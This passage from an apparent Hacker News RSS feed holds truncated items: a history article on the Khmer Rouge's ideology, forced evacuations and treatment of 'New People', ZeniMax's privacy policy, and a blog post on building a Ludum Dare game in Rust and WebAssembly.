<p>The Khmer Rouge’s ideology combined elements of&nbsp;<a href="https://en.wikipedia.org/wiki/Marxism">Marxism</a>&nbsp;with an extreme version of Khmer nationalism and&nbsp;<a href="https://en.wikipedia.org/wiki/Xenophobia">xenophobia</a>. It combined an idealization of the&nbsp;<a href="https://en.wikipedia.org/wiki/Angkor_Empire">Angkor Empire</a>&nbsp;(802–1431), with an existential fear for the existence of the Cambodian state, which had historically been liquidated under Vietnamese and Siamese intervention.The spillover of Vietnamese fighters from the&nbsp;<a href="https://en.wikipedia.org/wiki/Vietnam_War">Vietnam War</a>&nbsp;further aggravated anti-Vietnamese feeling. The Khmer Rouge explicitly targeted the Chinese, Vietnamese, and even their partially Khmer offspring for extinction; although the&nbsp;<a href="https://en.wikipedia.org/wiki/Cham_people">Cham Muslims</a>&nbsp;were treated unfavorably, they were encouraged to “mix flesh and blood”, to intermarry and assimilate. Some people with partial Chinese or Vietnamese ancestry were present in the Khmer Rouge leadership; they either were purged or participated in the&nbsp;<a href="https://en.wikipedia.org/wiki/Ethnic_cleansing">ethnic cleansing</a>&nbsp;campaigns.</p>
<p>The Khmer Rouge’s social policy focused on working towards a purely agrarian society. Pol Pot strongly influenced the propagation of this policy. He was reportedly impressed with how the mountain tribes of Cambodia lived, which the party interpreted as a form of&nbsp;<a href="https://en.wikipedia.org/wiki/Primitive_communism">primitive communism</a>; as a result, those minorities received more lenient and sometimes even more favorable treatment than the urbanized “<a href="https://en.wikipedia.org/wiki/Bourgeois">bourgeois</a>” Chinese and Vietnamese. Pol Pot wanted to remove social institutions and to transform the society into an agrarian one. This was his way of “[creating] a complete Communist society without wasting time on the intermediate steps” as the Khmer Rouge said to&nbsp;<a href="https://en.wikipedia.org/wiki/China">China</a>&nbsp;in 1975.</p>
<h2>Control of the countryside</h2>
<p>The Khmer Rouge advanced during 1973. After they reached the outskirts of Phnom Penh, Sar issued orders during the peak of the <a href="https://en.wikipedia.org/wiki/Wet_season">rainy season</a> that the city be taken. The orders led to futile attacks and wasted lives within the Khmer Rouge army. By the middle of 1973, the Khmer Rouge under Sar controlled almost two-thirds of the country and half the population.</p>
<p>Internationally, Sar and the Khmer Rouge gained the recognition of 63 countries as the true government of Cambodia. A move was made at the UN to give the seat for Cambodia to the Khmer Rouge; they prevailed by three votes.</p>
<div>
<p>The Khmer Rouge took the capital <a href="https://en.wikipedia.org/wiki/Phnom_Penh">Phnom Penh</a> on 17 April 1975, proclaiming this be Year Zero – all culture and traditions within society would be completely destroyed or discarded, and a new revolutionary culture would replace it.</p>
<figure data-shortcode="caption" id="attachment_473" aria-describedby="caption-attachment-473"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg"><img data-attachment-id="473" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/d158d8646827595a49fa281c27071779/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg" data-orig-size="611,404" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Phnom Penh, January 1st, 1975 in the waning days of the civil war." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=611" src="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=580&amp;h=383" alt="Phnom Penh, January 1st, 1975 in the waning days of the civil war." width="580" height="383" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=580&amp;h=383 580w, https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=150&amp;h=99 150w, https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg?w=300&amp;h=198 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/d158d8646827595a49fa281c27071779.jpg 611w" sizes="(max-width: 580px) 100vw, 580px"></a><figcaption id="caption-attachment-473">Phnom Penh, January 1st, 1975 in the waning days of the civil war.</figcaption></figure>
<h2>Societal transformation</h2>
<p>After taking power, the Khmer Rouge leadership renamed the country Democratic Kampuchea. The Khmer Rouge subjected Cambodia to a radical social reform process that was aimed at creating a purely&nbsp;<a href="https://en.wikipedia.org/wiki/Agrarian_socialism">agrarian-based Communist society</a>.&nbsp;The Khmer Rouge forced around three million people from the cities to the countryside to take up work in agriculture. They forced many people out of their homes and ignored many basic human freedoms; they controlled how Cambodians acted, what they wore, to whom they could talk, and many other aspects of their lives.</p>
<dl id="attachment_472">
<dt><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png"><img data-attachment-id="472" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/90631961305feae1ac126f4e2ae87bc7/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png" data-orig-size="1204,1007" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="The evacuation of Cambodia’s urban areas occurred on the pretext of a U.S. invasion that never came." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=820" src="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=300&amp;h=251" alt="The evacuation of Cambodia's urban areas occurred on the pretext of a U.S. invasion that never came." width="300" height="251" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=300&amp;h=251 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=600&amp;h=502 600w, https://openendedsocialstudies.files.wordpress.com/2016/06/90631961305feae1ac126f4e2ae87bc7.png?w=150&amp;h=125 150w" sizes="(max-width: 300px) 100vw, 300px"></a></dt>
<dd>The evacuation of Cambodia’s urban areas occurred on the pretext of a U.S. invasion that never came.</dd>
</dl>
<p>The Khmer Rouge believed that parents were tainted with&nbsp;<a href="https://en.wikipedia.org/wiki/Capitalism">capitalism</a>, so they separated children from their parents, indoctrinated them in&nbsp;<a href="https://en.wikipedia.org/wiki/Communism">communism</a>, and taught them torture methods with animals. Children were a “dictatorial instrument of the party” and were given leadership in torture and executions.</p>
<p>Society was divided into two categories. These were the New People – intellectuals, city-dwellers, minority people, and many of their own party members and soldiers who were suspected of being traitors – and the Old People – those who already lived in the countryside.</p>
<p>The lowest unit of social control, the&nbsp;<em>krom</em>&nbsp;(group), consisted of ten to fifteen nuclear families whose activities were closely supervised by a three-person committee. The committee chairman was selected by the CPK. This grass roots leadership was required to note the social origin of each family under its jurisdiction and to report it to persons higher up in the&nbsp;party hierarchy.</p>
<h2>The New People</h2>
<div>
<figure data-shortcode="caption" id="attachment_475" aria-describedby="caption-attachment-475"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg"><img data-attachment-id="475" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/khmer_rouge_07/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg" data-orig-size="611,404" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Forced labor camp in Kampong Cham, Cambodia." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=611" src="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=368&amp;h=243" alt="Forced labor camp in Kampong Cham, Cambodia." width="368" height="243" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=368&amp;h=243 368w, https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=150&amp;h=99 150w, https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg?w=300&amp;h=198 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/khmer_rouge_07.jpg 611w" sizes="(max-width: 368px) 100vw, 368px"></a><figcaption id="caption-attachment-475">Forced labor camp in Kampong Cham, Cambodia.</figcaption></figure>
<p>New People were treated as forced laborers. They were constantly moved, were forced to do the hardest physical labor, and worked in the most inhospitable, fever-ridden parts of the country, such as forests, upland areas, and swamps. “New People were segregated from Old People, enjoyed little or no privacy, and received the smallest rice rations. When the country experienced <a href="https://en.wikipedia.org/wiki/Famine">food shortages</a> in 1977, the New People suffered the most.</p>
</div>
<p>The medical care available to them was primitive or nonexistent. Families often were separated because people were divided into work brigades according to age and sex and sent to different parts of the country. New People were subjected to unending political indoctrination and could be executed without trial.</p>
<p>One of their mottos in reference to the <a href="https://en.wikipedia.org/wiki/New_People">New People</a> was: “To keep you is no benefit. To destroy you is no loss.”</p>
<p>The situation of the Old People under Khmer Rouge rule was more ambiguous. Refugee interviews reveal cases in which villagers were treated as harshly as the New People, enduring forced labor, indoctrination, the separation of children from parents, and executions; however, they were generally allowed to remain in their native villages.</p>
</div>
</div>
<h2>Life Under the Khmer Rouge</h2>
<div>
<p>Once in power, the Khmer Rouge carried out a radical program that included isolating the country from all foreign influences, closing schools, hospitals, and factories, abolishing banking, finance, and currency, outlawing all religions, confiscating all <a href="https://en.wikipedia.org/wiki/Private_property">private property</a> and relocating people from urban areas to <a href="https://en.wikipedia.org/wiki/Collective_farm">collective farms</a> where forced labor was widespread. The purpose of this policy was to turn all Cambodians into Old People through agricultural labor.</p>
<figure data-shortcode="caption" id="attachment_466" aria-describedby="caption-attachment-466"><a href="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg"><img data-attachment-id="466" data-permalink="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/8e1cd4dbed4fa55ac88aba90e53ea0e8/" data-orig-file="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg" data-orig-size="826,779" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="The evactuation of Phnom Penh, 1975." data-image-description="" data-medium-file="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=300" data-large-file="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=820" src="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=300&amp;h=283" alt="The evacuation of Phnom Penh, 1975." width="300" height="283" srcset="https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=300&amp;h=283 300w, https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=600&amp;h=566 600w, https://openendedsocialstudies.files.wordpress.com/2016/06/8e1cd4dbed4fa55ac88aba90e53ea0e8.jpg?w=150&amp;h=141 150w" sizes="(max-width: 300px) 100vw, 300px"></a><figcaption id="caption-attachment-466">The evacuation of Phnom Penh, 1975.</figcaption></figure>
<p>In Phnom Penh and other cities, the Khmer Rouge told <a href="https://en.wikipedia.org/wiki/Residency_(domicile)">residents</a> that they would be moved only about “two or three kilometers” outside the city and would return in “two or three days”. Some witnesses say they were told that the evacuation was because of the “threat of American bombing” and that they did not have to lock their houses since the Khmer Rouge would “take care of everything” until they returned. People who refused to evacuate would have their homes burned to the ground and would be killed immediately. The evacuees were sent on long marches to the countryside, which killed thousands of children, elderly people, and sick people.These were not the first evacuations of civilian populations by the Khmer Rouge; similar evacuations of populations without possessions had been occurring on a smaller scale since the early 1970s.</p>
<p>The entire population was forced to become farmers in <a href="https://en.m.wikipedia.org/wiki/Labour_camp">labor camps</a>. Cambodians were expected to produce three tons of rice per hectare; before the Khmer Rouge era, the average was only one ton per hectare. The total lack of agricultural knowledge by the former city dwellers made <a href="https://en.m.wikipedia.org/wiki/Famine">famine</a> inevitable. Rural dwellers were often unsympathetic or too frightened to assist them. Such acts …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/">https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/</a></em></p>]]>
            </description>
            <link>https://openendedsocialstudies.org/2016/06/24/the-khmer-rouge-genocide-in-the-name-of-utopia/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836985</guid>
            <pubDate>Tue, 14 Jul 2020 19:57:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Doom Eternal Privacy Policy Allows Collection and Disclosure of Medical Records]]>
            </title>
            <description>
<![CDATA[
Score 170 | Comments 125 (<a href="https://news.ycombinator.com/item?id=23836876">thread link</a>) | @gentleman11
<br/>
July 14, 2020 | https://wrap.bnet.idtech.services/legal/?limited=true&fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html | <a href="https://web.archive.org/web/*/https://wrap.bnet.idtech.services/legal/?limited=true&fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p><img src="https://esrbstorage.blob.core.windows.net/esrbcontent/images/privacy_certified_globe_color.gif" alt="ESRB PRIVACY CERTIFIED MEMBER CONFIRMATION"></p>

<p>Last Updated: January 27, 2020</p>
<p>This ZeniMax Media Online Privacy Policy ("<strong>Policy</strong>") describes how ZeniMax Media Inc. and our affiliates and subsidiaries (collectively, "<strong>ZeniMax</strong>", "<strong>we</strong>" or "<strong>us</strong>") collect, use and otherwise process the personal information we collect about our about customers, purchasers, subscribers, and/or users (each a " <strong>User</strong>") of our mobile applications, games, websites and other online services (collectively, our " <strong>Services</strong>").</p>
<table>
  <tbody><tr>
    <th colspan="3">Overview of Our Collection and Use of Personal Information</th>
  </tr>
  <tr>
    <td colspan="3">This table provides an overview and is intended to summarize key information about our information practices, which are further explained in our Privacy Policy below.  The actual information we collect about you and the use of such personal information will vary depending upon the nature of our relationship and interactions with you. </td>
  </tr>
  <tr>
    <td colspan="2">Categories of personal information collected  </td>
    <td colspan="1">Uses of personal information </td>
  </tr>
  <tr>
    <td colspan="2"><b>Name, contact info and other identifiers</b> (e.g., name, email, address, username and alias; UID, BUID, device id, third party platform identifiers and account details (e.g., PlayStationÂ®, Xbox, Steam, Facebook), and other online or unique identifiers)</td>
    <td rowspan="7">
    <ul>
      <li>Providing our Services and related support</li>
      <li>Protecting the integrity of the Services</li>
      <li>Analyzing and improving the Services and our business</li>
      <li>Personalizing the Services</li><li>Advertising, marketing and promotional purposes</li>
      <li>Securing and protecting our business</li>
      <li>Defending our legal rights</li>
      <li>Auditing, reporting, corporate governance, and internal operations</li>
      <li>Complying with legal obligations</li>
    </ul>
</td>
  </tr>
   <tr>
    <td colspan="2"><b>Paper and electronic customer records</b> (e.g., your account and profile, which contains personal information, such as username, name, demographics and other characteristics or descriptions, email, address, telephone number, and other contact information, account credentials, communications preferences, and customer service and support tickets and other records)</td>
  </tr>
   <tr>
    <td colspan="2"><b>Purchase history and tendencies</b> (e.g., information about your subscriptions current and past payments and purchases, and your purchase tendencies)</td>
  </tr>
   <tr>
     <td colspan="2"><b>Usage data</b> (e.g., usage and preference details related to your use of the Services, such as language, in-game purchases, game-play statistics, scores, persona, characters, achievements, rankings, time spent playing, click paths, game profile, preferences and friends)</td>
  </tr>
  <tr>
    <td colspan="2"><b>Geolocation data</b> (e.g., for mobile games users)</td>
  </tr>
   <tr>
    <td colspan="2"><b>Audio, video and other electronic data</b> (e.g., call recordings of customer support calls, and User photos submitted to the Services)</td>
  </tr>
   <tr>
    <td colspan="2"><b>Profiles and inferences</b> (e.g., profiles based on your account and activities, that reflect your preferences, characteristics, and abilities related to the Services)</td>
  </tr>
   <tr>
    <td colspan="3"><b>ESRB Privacy certification.</b> ZeniMax values the importance of your privacy and has received the ESRB Privacy Certification. ZeniMax is a valid licensee, and participating member of the Entertainment Software Rating Board's Privacy Certified Program (â€œ<b>ESRB Privacy Certified</b>â€�). All Services where this Policy is posted and which display an ESRB certification seal have been reviewed and certified by ESRB Privacy Certified to meet established online information collection, use and disclosure practices. As a licensee of this privacy program, we are subject to audits of our Services and other enforcement and accountability mechanisms administered independently by the ESRB.</td>
  </tr>
    <tr>
      <td colspan="3"><b>Individual rights.</b> Please see Section 12. User Rights and Choices below for a description of the choices we provide and the rights you have regarding your personal information. If you are a California resident, please be sure to review Section 15.a.  <u>Additional information for California Residents</u> below for important information about the categories of personal information we collect and disclose and your rights under California privacy laws.  If you are in the European Economic Area, please see Section 15.b. <u>Users in the European Economic Area</u> for more information about your rights under the EU General Data Protection Regulation (GDPR).</td>
  </tr>
</tbody></table>

<p>Scope of Our Policy</p>
<p>Personal Information We Collect</p>
<p>Purposes of Use and Legal Bases for Processing of Personal Information</p>
<p>Disclosure and Sharing of Personal Information</p>
<p>Cookies, Analytics and Personalization</p>
<p>Interest-based Advertising</p>
<p>Third Party Links and Features</p>
<p>User Generated Content</p>
<p>Security of Your Information</p>
<p>Data Retention</p>
<p>International Transfers of Data</p>
<p>User Rights and Choices</p>
<p>Contact Details</p>
<p>Changes to this Policy</p>
<p>Additional Information for Users in Certain Jurisdictions</p>
<p><strong>1.</strong>  <strong>Scope of Our Policy</strong></p>
<p>This Policy applies to the personal information that ZeniMax collects and processes about Users related to our Services, including games published by Bethesda Softworks and ZeniMax Online Studios, and games developed by other ZeniMax studios; more information about our studios is available at www.zenimax.com/studios.  This Policy does not apply to any third party websites, services, products or mobile applications maintained by other companies, which are linked to from our Services.</p>
<p>By registering for an account with us, providing your information to us through the Services, or otherwise using any of our Services, you understand and acknowledge that ZeniMax may process your personal information in accordance with this Policy. If you do not want this Policy to apply to you, please do not use the Services or communicate with us via the Services. If required by applicable law, we will obtain your consent to our collection, use, transfer and disclosure of your personal information.</p>
<p><strong>Personal Information.</strong>  In this Policy, our use of the term "personal information" includes other similar terms under applicable privacy lawsâ€”such as "personal data" and "personally identifiable information."  In general, personal information includes any information that identifies, relates to, describes, or is reasonably capable of being associated, or reasonably linked or linkable with a particular individual.</p>
<p><strong>Not Covered by this Policy.</strong>  This Policy does not apply to job applicants and candidates who apply for employment with us, or to employees and non-employee workers in the context of our working relationship with them.</p>
<p><strong>2.</strong>  <strong>Personal Information We Collect</strong></p>
<p>The information we collect about Users varies depending upon the circumstances and the Services used.</p>
<p>ZeniMax collects personal information directly from Users, automatically related to the use of the Services, and in some cases, from third parties (such as social networks, platform providers, payment processors, and operators of certain third party services that we use).</p>
<p><strong>Information We Collect From You</strong>.  Generally, we collect your personal information on a voluntary basis. However, if you decline to provide certain personal information that is marked mandatory, you may not be able to access certain Services or we may be unable to fully respond to your inquiry. We collect the following personal information from you:</p>
<ul>
<li>
<p>Registration and Profile Information.  To access and use certain Services (e.g., to register a game, download or use a mobile application, access subscription-based Services, create an account) you may be required to register with us, by providing us with certain required information, which is identified on the registration page. Depending upon the Services you use, this may include your name, a username and password, as well as country of residence, email, and contact information; certain Services will not be available if you decline to provide required information. We may also ask you or allow you to submit certain optional information, which may include your phone number, birthdate, location, preferences, a photo or avatar, and other profile information.</p>
</li>
<li>
<p>Purchases and Payments Information.  If you make a purchase or sign up for certain subscription-based Services, you are required to provide your payment information, including name, billing and shipping address and details, payment type, as well as credit card number or other payment account details (e.g., PayPal). We work with third parties like payment processors and fulfillment partners to process these payments. We do not collect, receive, process or store credit card or debit card numbers, or other third-party payment account credentials (e.g., PayPal); this information is collected directly by these third parties. Depending upon the Service, we may receive your username, name, email, the payment type, product(s) or service(s), and other transaction details, and maintain records of your purchase and subscription history.</p>
</li>
<li>
<p>Marketing, Contests and Promotions.  Users can sign up online or in-person (e.g., at tradeshows, conferences and the like) to receive direct marketing communications from us, including emails about game launches, developments, and upcoming releases. If you agree to receive direct marketing communications from us, we collect your email address, and we may also collect your name, preferences, and if relevant, information about your account and the Services and other games you use. We may also run contests, sweepstakes or other events or activities (collectively, "events") on our websites and social media channels. Information collected for these events may include your name, age, email address, and other information.</p>
</li>
<li>
<p>Your Communications.  When you email us, call us, or otherwise send us communications regarding the Services, we collect and maintain a record of your contact details, communications and our responses. We may also maintain records of the in-game communications and information that you post in chat sessions, forums, and in other areas of the Services.</p>
</li>
</ul>
<p><strong>Information We Collect and Receive From Third Parties</strong>.  We may collect and receive personal information about you from third parties, such as:</p>
<ul>
<li>
<p>Third Party Platforms.  You may be able to login through or connect certain third party accounts (each a " <strong>Third Party Account</strong>")â€”such as Steam, Twitch, Xbox Live, PSN and Facebookâ€”to your account with us.  These Third Party Accounts are operated and managed by third …</p></li></ul></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://wrap.bnet.idtech.services/legal/?limited=true&amp;fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html">https://wrap.bnet.idtech.services/legal/?limited=true&amp;fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html</a></em></p>]]>
            </description>
            <link>https://wrap.bnet.idtech.services/legal/?limited=true&amp;fragment=https%3A%2F%2Fbethesda.net%2Fdata%2Fpp%2Fen_fr.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23836876</guid>
            <pubDate>Tue, 14 Jul 2020 19:49:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ludum Dare in 48 hours with Rust and WebAssembly]]>
            </title>
            <description>
<![CDATA[
Score 22 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23836386">thread link</a>) | @yannikyeo
<br/>
July 14, 2020 | https://ianjk.com/rust-gamejam/ | <a href="https://web.archive.org/web/*/https://ianjk.com/rust-gamejam/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <p><a href="https://ldjam.com/">Ludum Dare</a>, the world's premiere 48 hour solo gamejam, occurred back in April.</p>
<p>Ludum Dare has two tracks: the 'Compo' and the 'Jam'.</p>
<p>The rules of the Compo require you to make a game (other than source code) within 48 hours. At the end your fellow entrants will rate your game and your game will be ranked against your peers.</p>
<p>With everyone quarantined at home due to Coronavirus this April's Ludum Dare had vastly more entrants than usual. A total of 1383 people entered the Compo and there were 3576 entries to the Jam. That's an absurd amount of games!</p>
<p>I've entered the Compo a <a href="https://ldjam.com/events/ludum-dare/43/blueberry-bounce">few</a> <a href="https://ldjam.com/events/ludum-dare/42/noahs-help-1">times</a> using Unity, but this time around I wanted to write a game purely with the relatively new programming language Rust.</p>
<p>This post started out focused on the experience of using Rust, but turned into a general overview of the technical and design process for the game.</p>
<span id="continue-reading"></span>
<p><a href="https://www.rust-lang.org/">Rust</a> is a 'systems programming language' focused on performance and safety. 'Safety' means that Rust helps you avoid certain classes of vulnerabilities and crashes. I have been using Rust for my personal work and decided now was the time to give it a shot for a gamejam.</p>
<h2 id="why-not-unity">Why not Unity?</h2>
<p>I've entered at least five past Ludum Dares with Unity, and Unity with C# is by far the most common set of tools used for Ludum Dare. But I just simply haven't been enjoying Unity as much recently.</p>
<p>Unity is a giant game engine, but I find it hard to get into a flow state with. There are too many knobs, features, and ways to do things. It's easy to flip a bunch of switches and have something decent, but that just doesn't mesh with my personal design flow. I prefer to work in a clean mental environment, not a complex editor.</p>
<p>Additionally Unity's WebGL build takes around 20 minutes on my laptop, which is absolutely miserable.</p>

<p>I've been coding exclusively on a 2016 Macbook Pro for a while now. It's not the best, but not the worst.</p>
<p>I could have used an existing Rust game engine, but I'm not familiar with the popular ones. Instead I cobbled together a mix of Rust libraries and various personal Rust scripts.</p>
<p>Rust makes it trivially easy to use other libraries (which it calls crates) through its package manager <a href="https://crates.io/">crates.io</a>.</p>
<p>For this project I used the following crates:</p>
<ul>
<li><a href="https://github.com/kettle11/kApp">kApp</a> My personal windowing and input library designed to build super fast.</li>
<li><a href="https://github.com/rustwasm/wasm-bindgen">wasm-bindgen</a> The Rust ecosystem's standard way to call Javascript from Rust</li>
<li><a href="https://github.com/grovesNL/glow">glow</a> "GL on whatever" A wrapper around OpenGL and WebGL.</li>
</ul>
<p>The recommended way to work with Rust and WebAssembly (Wasm) is through a command line tool called <a href="https://github.com/rustwasm/wasm-pack"><code>wasm-pack</code></a>. I skipped using <code>wasm-pack</code> and instead just used a two line bash script that would run a Rust build and then call <code>wasm-bindgen</code> directly to generate the web bindings.</p>
<p>Quick iteration times are absolutely critical for a gamejam. The following tools were instrumental in attaining quick iteration times:</p>
<ul>
<li><a href="https://github.com/passcod/cargo-watch"><code>cargo watch</code></a> ran the build script automatically whenever the code was saved.</li>
<li><a href="https://crates.io/crates/devserver/0.1.0"><code>devserver</code></a> hosted the local web page and automatically reloaded it when a file changed</li>
<li>Visual Studio Code was configured to automatically save</li>
</ul>
<p>The combination of <code>cargo watch</code>, <code>devserver</code>, and the Visual Studio Code settings meant that I could edit a value, like a color, in my Rust code and watch it change on the web page nearly instantly.</p>
<p>Typical Rust build times were around 1-3 seconds while working on this project, but sometimes they'd inexplicably go up to around 10 seconds. Rust is known for slow build times, and these quick iteration times were only possible by carefully choosing tiny crates. My goal was to always have the new build ready on the web page by the time I changed to the browser window.</p>
<h2 id="code-structure">Code Structure</h2>
<p>With only 48 hours best practices go out the window, but even still I made some early choices to help make writing new code as easy as possible. One of the key things I wanted to ensure was that if I were to declare a new variable, or load a new asset, that it would only have to be declared once. Many Rust frameworks follow a pattern a bit like the following:</p>
<pre><code><span>struct </span><span>Game </span><span>{
    </span><span>player</span><span>:</span><span> Player,
    </span><span>/* Other stuff */
</span><span>}

</span><span>impl </span><span>Game </span><span>{
    </span><span>fn </span><span>setup</span><span>(</span><span>context</span><span>: &amp;</span><span>Context</span><span>) -&gt;</span><span> Game </span><span>{</span><span>
        Game </span><span>{</span><span>
            player</span><span>: </span><span>Player</span><span>::</span><span>new</span><span>(),
        }
    }

    </span><span>fn </span><span>update</span><span>(</span><span>context</span><span>: &amp;</span><span>Context</span><span>) {
        </span><span>/* Respond to user input and redraw here*/
    </span><span>}
}
</span></code></pre>
<p>The above works fine in regular scenarios, but when you add a new variable like 'player' it needs to be declared in multiple places. Instead I used a structure a bit like the following:</p>
<pre><code><span>fn </span><span>main</span><span>() {
    </span><span>let</span><span> player </span><span>= </span><span>Player</span><span>::</span><span>new</span><span>();
    </span><span>/* Other setup code here */

    </span><span>loop </span><span>{
        </span><span>/* Respond to user input and redraw here forever*/
    </span><span>}
}
</span></code></pre>
<p>This let me declare a variable and use it immediately, no extra fuss.</p>
<h2 id="async">Async</h2>
<p>Unfortunately the above structure doesn't work on web. On Web the main loop must return control to the browser.</p>
<p>The way to get around this is to pass a closure that the browser calls when an event occurs:</p>
<pre><code><span>fn </span><span>main</span><span>() {
    </span><span>let</span><span> player </span><span>= </span><span>Player</span><span>::</span><span>new</span><span>();
    </span><span>/* Other setup code here */

    </span><span>run</span><span>(</span><span>move </span><span>|</span><span>context</span><span>| {
        </span><span>/* Respond to events and draw here */
    </span><span>});
}
</span></code></pre>
<p>Rust windowing and input frameworks like <a href="https://github.com/rust-windowing/winit">Winit</a> use the above approach.</p>
<p>Another issue on web is loading assets. On non-web platforms it's simple to just wait for an asset to be done loading:</p>
<pre><code><span>let</span><span> wind_sound_handle </span><span>= </span><span>std</span><span>::</span><span>fs</span><span>::</span><span>read</span><span>("</span><span>wind.wav</span><span>").</span><span>unwrap</span><span>();
